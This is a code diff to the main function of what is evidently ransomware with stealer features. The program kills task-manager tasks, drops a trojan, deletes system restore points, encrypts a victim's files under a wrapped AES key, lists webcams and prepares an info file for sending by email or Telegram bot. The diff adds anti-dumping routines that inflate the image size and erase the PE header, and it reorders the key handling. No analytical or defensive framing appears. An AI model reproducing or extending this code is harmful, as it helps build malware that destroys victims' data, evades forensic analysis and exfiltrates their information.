@@ -21,6 +21,9 @@ int main(int argc, char* argv[])
     if (TSK_REMOVER)
         HANDLE hThreadTaskMng = CreateThread(NULL, 0, removeTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
 
+    if (ANTI_DUMPER)
+        imageSizeIncreaser();
+
     if (TROJAN) {
         dropFile(TrojanFileContent, TROJANFILE);
         HANDLE hThreadTrojan = CreateThread(NULL, 0, trojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
@@ -29,7 +32,6 @@ int main(int argc, char* argv[])
     if (DELETE_RESTOREPOINT)
         deleteRestorePoints();
 
-    string key = generateRandom(32);
 
     string dir;
     if (!DEBUG)
@@ -67,9 +69,10 @@ int main(int argc, char* argv[])
             threads[i].join();
     }
 
+    string key = aes_encrypt(KEYOFKEY, generateRandom(32), IV);
+
     for (int i = 0; i < filesSplitted.size(); i++)
-        threads[i] = thread(encryptFiles, filesSplitted[i], key);
-    key = aes_encrypt(KEYOFKEY, key, IV);   // it's here for more safety
+        threads[i] = thread(encryptFiles, filesSplitted[i], aes_decrypt(KEYOFKEY, key, IV));
 
 
     // info.txt
@@ -139,17 +142,19 @@ int main(int argc, char* argv[])
         for (string file : getWebcams())
             webcams += file + "\n";
     }
-
     webcams = aes_encrypt(KEY, webcams, IV);
     infoFileContent += webcams;
     infoFileContent += skCrypt("\n");
+
+    if (ANTI_DUMPER)    // here because it creates problems first
+        peHeaderDeleter();
 
     if (DEBUG && BACKUP_INFOFILE) {    // make a backup of infoFile
         ofstream infoFileBackup(split(INFOFILE, '\\').back());
         infoFileBackup << infoFileContent;
         infoFileBackup.close();
     }
-
+    
     bool dropInfoFile = DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT);
     if (dropInfoFile) {
         ofstream infoFile(INFOFILE);
